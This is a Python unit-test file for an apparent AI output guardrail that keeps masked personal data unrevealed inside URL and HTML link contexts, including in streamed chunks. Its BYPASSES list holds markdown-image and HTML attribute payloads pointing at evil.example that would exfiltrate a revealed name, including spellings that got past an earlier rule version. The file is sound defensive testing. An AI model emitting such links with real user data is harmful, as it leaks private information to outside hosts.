"""08-tam-1a r2 MAJOR-r2-1 (KARARLAR "C17 URL bağlam kuralı satır düzeyinde ve fail-closed"): no
placeholder on a line that carries `](`, `]:`, `//`, `src=`, `href=`, `srcset=`, `action=`,
`poster=` or `background=` is reversed; a markdown target left open at the end of such a line
carries the rule to the next line; a stream line longer than 8,192 characters keeps its
placeholders. Since r4 the HTML spellings below are kept by the per-stream HTML rule (KARARLAR
"C17 geri çevirme: cevap düzeyinde HTML fail-closed"), not by following quotes. The reviewer's
spellings that got through the r1 rule are all negative here, on the single text path and split
over stream chunks."""

import asyncio

import pytest

from ffcore.guardrails.masking import (
    URL_CONTEXT_MAX_CHARS,
    ContextReveal,
    StreamDetokenizer,
    detokenize_json,
    reveal_text,
)
from tests.unit.test_08t_c17_masking import _store_with

run = asyncio.run
NAME = "Ayşe Kaya"

BYPASSES = [
    "![x]( //evil.example/p?q=<<PII_1>>)",
    "![x][1]\n\n[1]: //evil.example/p?q=<<PII_1>>",
    "![x][1]\n\n[1]: evil.example/p?q=<<PII_1>>",
    "![x](<https://evil.example/a b?q= <<PII_1>>>)",
    "<img src=//evil.example/?q=<<PII_1>>>",
    '<img src="https://evil.example/a b?q= <<PII_1>>">',
    '<a href="https://evil.example/a b <<PII_1>>">x</a>',
    "<img SRC = 'x y <<PII_1>>'>",
    '<img srcset="a.png 1x, //evil.example/<<PII_1>> 2x">',
    '<form action="/p?q= <<PII_1>>">',
    '<video poster="p q <<PII_1>>">',
    '<td background="b c <<PII_1>>">',
    # targets continued on the next line
    "![x](\n<<PII_1>>)",
    "[1]:\n  //evil.example/<<PII_1>>",
    '<img src="https://evil.example/a\n?q=<<PII_1>>">',
    '<img src=\n"x\n\ny <<PII_1>>">',
]


def _reveal(text):
    store, _ = _store_with([NAME])
    return run(reveal_text(text, store=store, scope="run-1"))


def _stream(pieces, cls=StreamDetokenizer):
    store, _ = _store_with([NAME])

    async def go():
        if cls is StreamDetokenizer:
            sd = StreamDetokenizer(store, "run-1")
            out = [await sd.feed(p) for p in pieces]
            out.append(await sd.flush())
            return "".join(out)
        cr = ContextReveal(store, "run-1")
        return "".join([(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces])

    return run(go())


def _pieces(text, size):
    return [text[i : i + size] for i in range(0, len(text), size)]


@pytest.mark.parametrize("text", BYPASSES)
def test_08t_r2_url_line_kept_single_text(text):
    out, _, skipped = _reveal(text)
    assert NAME not in out and out == text
    assert skipped == text.count("<<PII_1>>")


@pytest.mark.parametrize("size", [1, 3, 7, 64])
@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
@pytest.mark.parametrize("text", BYPASSES)
def test_08t_r2_url_line_kept_over_stream_chunks(text, size, cls):
    assert NAME not in _stream(_pieces(text, size), cls)


def test_08t_r2_url_line_kept_in_json_strings():
    data = {"a": "[1]: //h/<<PII_1>>", "b": ["x <img src='y <<PII_1>>'>"], "c": "<<PII_1>>"}
    out, _, skipped = run(detokenize_json(data, store=_store_with([NAME])[0], scope="run-1"))
    assert out == {**data, "c": NAME} and skipped == 2


def test_08t_r2_placeholder_before_the_marker():
    # A text that stands alone keeps every placeholder of the line. A stream has already sent
    # what came before the marker; a value there is not in a target (every target starts after
    # its marker), and the placeholder in the target is kept.
    text = "Önce <<PII_1>> sonra ![x](https://evil.example/?q=<<PII_1>>)"
    assert _reveal(text)[0] == text
    streamed = _stream(_pieces(text, 5))
    assert streamed == f"Önce {NAME} sonra ![x](https://evil.example/?q=<<PII_1>>)"


def test_08t_r2_other_lines_are_reversed():
    text = "Sahibi <<PII_1>>.\nAyrıntı: https://site.example/kayit?u=<<PII_1>>\nTekrar <<PII_1>>."
    out, _, skipped = _reveal(text)
    assert out == (
        f"Sahibi {NAME}.\nAyrıntı: https://site.example/kayit?u=<<PII_1>>\nTekrar {NAME}."
    )
    assert skipped == 1


def test_08t_r2_closed_target_does_not_carry():
    # A markdown target closes on its own line: the next line is reversed. (An HTML tag keeps
    # the rest of the answer since r4, KARARLAR "cevap düzeyinde HTML fail-closed".)
    text = "![x](//h/a.png)\n<<PII_1>>\n[1]: //h/b.png\n<<PII_1>>"
    out, _, _ = _reveal(text)
    assert out == f"![x](//h/a.png)\n{NAME}\n[1]: //h/b.png\n{NAME}"


def test_08t_r2_apostrophes_in_prose_do_not_carry():
    # An apostrophe in prose carries nothing (Turkish suffixes after a URL).
    text = "Bkz. https://h/x — Ayşe'nin kaydı\n<<PII_1>>"
    assert _reveal(text)[0] == f"Bkz. https://h/x — Ayşe'nin kaydı\n{NAME}"


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r2_url_start_beyond_the_window_is_kept(cls):
    # r2: the URL began more than 8,192 characters earlier on the same line.
    text = "https://evil.example/" + "a" * (URL_CONTEXT_MAX_CHARS + 50) + "<<PII_1>>"
    assert NAME not in _stream(_pieces(text, 100), cls)


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r2_line_longer_than_the_window_is_kept(cls):
    # fail-closed: the stream lost the line's start, so the placeholder stays.
    text = "x " * (URL_CONTEXT_MAX_CHARS // 2 + 10) + "<<PII_1>>"
    assert NAME not in _stream(_pieces(text, 100), cls)
    # a new line starts the rule over
    assert _stream(_pieces(text + "\n<<PII_1>>", 100), cls).endswith("\n" + NAME)


def test_08t_r2_long_whitespace_inside_an_attribute_is_kept():
    text = "<img src" + " " * (URL_CONTEXT_MAX_CHARS + 10) + "=x<<PII_1>>>"
    assert NAME not in _stream(_pieces(text, 50))
